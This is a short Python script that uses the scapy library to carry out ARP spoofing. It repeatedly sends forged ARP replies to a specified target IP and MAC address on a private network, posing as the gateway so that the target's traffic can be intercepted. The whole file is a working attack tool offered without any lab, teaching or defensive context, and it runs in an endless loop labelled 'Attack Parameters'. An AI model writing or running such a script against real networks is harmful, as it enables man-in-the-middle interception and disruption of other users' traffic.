from scapy.all import ARP, send 
import time

def arp_spoof(target_ip, spoof_ip, target_mac):
    while True:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=0)
        time.sleep(2)  # Every 2 seconds, it sends packets 

# Attack Parameters 
target_ip = "192.168.1.112"  # IP target
target_mac = "14:87:6a:07:72:c4"  # MAC target
spoof_ip = "192.168.1.1"  # Gateway IP

try:
    arp_spoof(target_ip, spoof_ip, target_mac)
except KeyboardInterrupt:
    print("\nARP spoofing interrupted.")
